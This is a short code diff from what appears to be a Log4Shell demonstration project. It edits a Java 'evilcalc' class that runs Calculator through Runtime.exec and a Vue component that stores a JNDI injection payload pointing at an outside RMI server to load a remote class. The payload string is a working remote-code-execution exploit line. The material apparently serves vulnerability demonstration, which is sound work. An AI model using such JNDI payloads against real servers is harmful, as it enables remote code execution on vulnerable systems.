@@ -54,6 +54,7 @@
         public evilcalc (){
             try{
                 // Runtime.getRuntime().exec("calc.exe"); // Windows
+                // Runtime.getRuntime().exec("open -a Calculator"); // macOS
                 Runtime.getRuntime().exec("open -a Calculator"); // macOS
             }catch (Exception e){
                 e.printStackTrace();
@@ -159,7 +160,7 @@ export default {
     data() {
         return {
             activeName: 'first',
-            payload1: '${jndi:rmi://150.109.15.229:9999/evilcalc1}',
+            payload1: '${jndi:rmi://150.109.15.229:9999/evilfile}',
             payload2: '',
         };
     },
